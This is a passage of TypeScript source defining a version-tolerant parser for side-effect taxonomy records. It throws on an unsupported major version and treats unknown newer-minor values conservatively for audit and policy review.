 *    NEVER silently trusted (they read as `unknown` → non-retryable, review/deny by policy, data-carrying
 *    for exfil).
 *  - different major (v2+) or unparseable version → THROW; a semantic break an old build must not guess.
 *
 * Producers and same-version consumers use `SideEffect.parse`; cross-version audit verifiers use this.
 */
export function parseSideEffectCompat(raw: unknown): SideEffectT {
  const ver =
    typeof raw === "object" && raw !== null
      ? (raw as Record<string, unknown>)["taxonomyVersion"]
      : undefined;
  const p = typeof ver === "string" ? parseTaxonomyVersion(ver) : null;
  if (p !== null && p.major !== SIDE_EFFECT_TAXONOMY_MAJOR) {
    throw new Error(
      `unsupported side-effect taxonomy major v${p.major} (this build implements v${SIDE_EFFECT_TAXONOMY_MAJOR}); a v${p.major} record is a semantic break and must not be guessed at`,
    );
  }
  if (p !== null && p.minor > SIDE_EFFECT_TAXONOMY_MINOR) {
    // raw is guaranteed a non-null object here (its `taxonomyVersion` parsed as a string).
    return SideEffect.parse(coerceUnknownEnums(raw as Record<string, unknown>));
  }
  return SideEffect.parse(raw);
}
